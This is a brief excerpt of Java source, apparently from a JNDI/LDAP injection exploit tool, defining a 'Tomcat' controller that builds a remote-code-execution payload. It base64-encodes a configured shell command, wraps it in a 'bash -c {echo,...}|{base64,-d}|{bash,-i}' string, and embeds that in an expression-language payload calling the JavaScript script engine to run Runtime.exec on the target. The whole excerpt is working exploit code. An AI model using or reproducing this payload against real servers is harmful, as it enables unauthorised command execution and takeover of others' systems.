...
public class Tomcat implements LdapController {
    ...
    String base64Command = "bash -c {echo," + Base64.getEncoder().encodeToString(Config.command.getBytes()) + "}|{base64,-d}|{bash,-i}";
    String payload = String.format("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
        "\"java.lang.Runtime.getRuntime().exec('%s')\")", base64Command);
